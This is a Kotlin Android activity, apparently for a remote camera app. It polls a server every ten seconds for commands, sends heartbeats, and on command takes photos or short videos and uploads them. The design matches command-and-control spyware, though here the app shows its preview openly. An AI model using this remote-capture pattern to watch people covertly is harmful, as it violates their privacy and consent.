package com.goldfish.ai

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.camera.view.PreviewView
import androidx.camera.core.Preview
import androidx.core.content.ContextCompat
import com.goldfish.ai.camera.CameraManager
import com.goldfish.ai.camera.LiveFrameManager
import com.goldfish.ai.network.AndroidService
import com.goldfish.ai.network.DeviceService
import com.goldfish.ai.network.UploadService
import java.io.File

class MainActivity : ComponentActivity() {

    private lateinit var previewView: PreviewView

    private var imageCapture: ImageCapture? = null

    private var videoCapture: VideoCapture<Recorder>? = null

    private var recording: Recording? = null

    private var liveFrameManager: LiveFrameManager? = null

    private val handler =
        Handler(
            Looper.getMainLooper()
        )

    private val pollRunnable =
        object : Runnable {

            override fun run() {

                pollCommand()

                AndroidService.heartbeat()

                handler.postDelayed(
                    this,
                    10000
                )
            }
        }

    private val permissionLauncher =
        registerForActivityResult(
            ActivityResultContracts.RequestPermission()
        ) { granted ->

            if (granted) {

                startCamera()

            } else {

                Log.e(
                    "CAMERA",
                    "Permission denied"
                )
            }
        }

    override fun onCreate(
        savedInstanceState: Bundle?
    ) {

        super.onCreate(
            savedInstanceState
        )

        previewView =
            PreviewView(this)

        setContentView(
            previewView
        )

        checkPermission()
    }

    override fun onDestroy() {

        super.onDestroy()

        handler.removeCallbacks(
            pollRunnable
        )

        liveFrameManager?.stop()
    }

    private fun checkPermission() {

        if (
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.CAMERA
            )
            ==
            PackageManager.PERMISSION_GRANTED
        ) {

            startCamera()

        } else {

            permissionLauncher.launch(
                Manifest.permission.CAMERA
            )
        }
    }

    private fun startCamera() {

        val cameraProviderFuture =
            ProcessCameraProvider.getInstance(
                this
            )

        cameraProviderFuture.addListener({

            val cameraProvider =
                cameraProviderFuture.get()

            val preview =
                Preview.Builder()
                    .build()
                    .also {

                        it.setSurfaceProvider(
                            previewView.surfaceProvider
                        )
                    }

            imageCapture =
                ImageCapture.Builder()
                    .build()

            val recorder =
                Recorder.Builder()
                    .setQualitySelector(
                        QualitySelector.from(
                            Quality.HD
                        )
                    )
                    .build()

            videoCapture =
                VideoCapture.withOutput(
                    recorder
                )

            val cameraSelector =
                CameraSelector.DEFAULT_BACK_CAMERA

            cameraProvider.unbindAll()

            cameraProvider.bindToLifecycle(
                this,
                cameraSelector,
                preview,
                imageCapture,
                videoCapture
            )

            Log.d(
                "CAMERA",
                "Camera READY"
            )

            imageCapture?.let {

                liveFrameManager =
                    LiveFrameManager(
                        context = this,
                        imageCapture = it
                    )

                liveFrameManager?.start()

                Log.d(
                    "LIVE_FRAME",
                    "Live monitor started"
                )
            }

            startPolling()

        }, ContextCompat.getMainExecutor(this))
    }

    // ==========================
    // POLLING
    // ==========================

    private fun startPolling() {

        handler.removeCallbacks(
            pollRunnable
        )

        handler.post(
            pollRunnable
        )

        Log.d(
            "POLL",
            "Polling started"
        )
    }

    private fun pollCommand() {

        DeviceService.pollCommand {

                action,
                type ->

            Log.d(
                "POLL",
                "Action=$action Type=$type"
            )

            if (
                action != "capture"
            ) {
                return@pollCommand
            }

            runOnUiThread {

                when (type) {

                    "image" -> {

                        triggerCapture()
                    }

                    "video" -> {

                        startVideoRecording()
                    }
                }
            }
        }
    }

    // ==========================
    // IMAGE
    // ==========================

    private fun triggerCapture() {

        val capture =
            imageCapture

        if (capture == null) {

            Log.e(
                "CAPTURE",
                "ImageCapture NULL"
            )

            return
        }

        Log.d(
            "CAPTURE",
            "CAPTURE TRIGGERED"
        )

        val manager =
            CameraManager(
                capture
            )

        manager.takePhoto(
            this
        ) { file: File ->

            Log.d(
                "FILE",
                "Image saved: ${file.absolutePath}"
            )

            UploadService.upload(
                file
            )
        }
    }

    // ==========================
    // VIDEO
    // ==========================

    private fun startVideoRecording() {

        if (
            recording != null
        ) {

            Log.d(
                "VIDEO",
                "Already recording"
            )

            return
        }

        val videoCap =
            videoCapture ?: return

        val file =
            File(
                cacheDir,
                "VID_${System.currentTimeMillis()}.mp4"
            )

        val outputOptions =
            FileOutputOptions.Builder(
                file
            ).build()

        recording =
            videoCap.output
                .prepareRecording(
                    this,
                    outputOptions
                )
                .start(
                    ContextCompat.getMainExecutor(
                        this
                    )
                ) { event ->

                    when (event) {

                        is VideoRecordEvent.Start -> {

                            Log.d(
                                "VIDEO",
                                "Recording START"
                            )
                        }

                        is VideoRecordEvent.Finalize -> {

                            Log.d(
                                "VIDEO",
                                "Saved: ${file.absolutePath}"
                            )

                            UploadService.upload(
                                file
                            )
                        }
                    }
                }

        previewView.postDelayed({

            stopRecording()

        }, 5000)
    }

    private fun stopRecording() {

        recording?.stop()

        recording = null

        Log.d(
            "VIDEO",
            "Recording STOP"
        )
    }
}